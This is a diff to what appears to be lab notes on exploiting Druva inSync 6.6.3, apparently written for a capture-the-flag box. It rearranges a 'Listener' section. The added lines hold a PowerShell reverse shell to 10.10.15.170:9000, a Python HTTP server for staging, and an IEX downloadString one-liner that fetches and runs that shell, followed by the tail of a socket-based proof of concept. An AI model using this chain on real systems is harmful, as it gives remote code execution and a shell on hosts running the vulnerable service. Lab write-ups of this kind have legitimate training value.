@@ -58,6 +58,16 @@ Druva inSync 6.6.3 exploit
 Druva inSync 6.6.3 vulnerability
 ```
 
+# Listener
+```powershell
+Invoke-PowerShellTcp.ps1 faylının sonuna bunu yaz:
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.170 -Port 9000
+
+python3 -m http.server 8080
+
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.170:12000/Invoke-PowerShellTcp.ps1')"
+```
+
 # Proof of Concept
 ```powershell
 $ErrorActionPreference = "Stop"
@@ -80,13 +90,4 @@ $s.Send($header)
 $s.Send($rpcType)
 $s.Send($length)
 $s.Send($command)
-```
-
-# Listener
-```powershell
-Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
-
-python3 -m http.server 8080
-
-$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')"
 ```
